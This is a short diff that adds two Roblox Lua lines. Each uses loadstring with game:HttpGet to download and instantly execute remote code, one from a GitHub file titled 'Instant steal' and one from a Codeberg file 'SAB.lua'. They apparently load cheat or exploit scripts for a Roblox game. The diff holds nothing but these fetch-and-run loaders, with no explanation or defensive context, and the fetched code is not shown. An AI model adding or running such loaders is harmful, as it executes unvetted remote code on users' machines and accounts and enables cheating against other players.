@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D11plus/Sab/refs/heads/main/Instant%20steal"))()
+loadstring(game:HttpGet("https://codeberg.org/flinthub/FlintHub/raw/branch/main/SAB.lua"))()
